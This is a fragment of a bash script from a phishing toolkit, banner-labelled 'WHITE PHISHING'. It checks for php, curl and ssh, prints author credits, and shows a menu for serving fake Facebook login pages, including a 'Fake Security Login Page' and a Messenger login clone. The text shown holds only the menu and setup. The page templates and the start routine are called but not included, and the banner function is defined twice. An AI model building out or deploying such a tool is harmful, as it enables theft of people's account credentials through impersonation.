trap 'printf "\n";stop;exit 1' 2
deps() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "curl is not installed ! Install it."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "openssh is not installed ! Install it."; exit 1; }
}
banner() {
clear
printf " \e[31;1m ░██╗░░░░░░░██╗██╗░░██╗██╗████████╗███████╗ \e[0m\n"
printf " \e[32;1m ░██║░░██╗░░██║██║░░██║██║╚══██╔══╝██╔════╝ \e[0m\n"
printf " \e[33;1m ░╚██╗████╗██╔╝███████║██║░░░██║░░░█████╗░░ \e[0m\n"
printf " \e[34;1m ░░████╔═████║░██╔══██║██║░░░██║░░░██╔══╝░░ \e[0m\n"
printf " \e[35;1m ░░╚██╔╝░╚██╔╝░██║░░██║██║░░░██║░░░███████╗ \e[0m\n"
printf " \e[36;1m ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚══════╝ \e[0m\n"
printf " \e[31;1m ██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░ \e[0m\n"
printf " \e[32;1m ██╔══██╗██║░░██║██║██╔════╝██║░░██║██║████╗░██║██╔════╝░ \e[0m\n"
printf " \e[33;1m ██████╔╝███████║██║╚█████╗░███████║██║██╔██╗██║██║░░██╗░ \e[0m\n"
printf " \e[34;1m ██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗ \e[0m\n"
printf " \e[35;1m ██║░░░░░██║░░██║██║██████╔╝██║░░██║██║██║░╚███║╚██████╔╝ \e[0m\n"
printf " \e[36;1m ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░ \e[0m\n"
}
banner() {
clear
printf " \e[31;1m .̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷                     \e[0m\n"
printf " \e[32;1m →AUTHOR BY : MOHAMMAD SHIHAB UDDIN                         \e[0m\n"
printf " \e[33;1m →YOUTUBE   : INTERNET HELP ZONE                            \e[0m\n"
printf " \e[34;1m →GITHUB    : http://github.com/internet-help-zone-shihab     \e[0m\n"
printf " \e[35;1m →CHAKED BY : FARHAN AHAMED                                 \e[0m\n"
printf " \e[36;1m .̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷.̷                     \e[0m\n"
}
facebook(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="fb_advanced"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="fb_security"
start
elif [[ $option == 4 || $option == 04 ]]; then
server="fb_messenger"
start
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}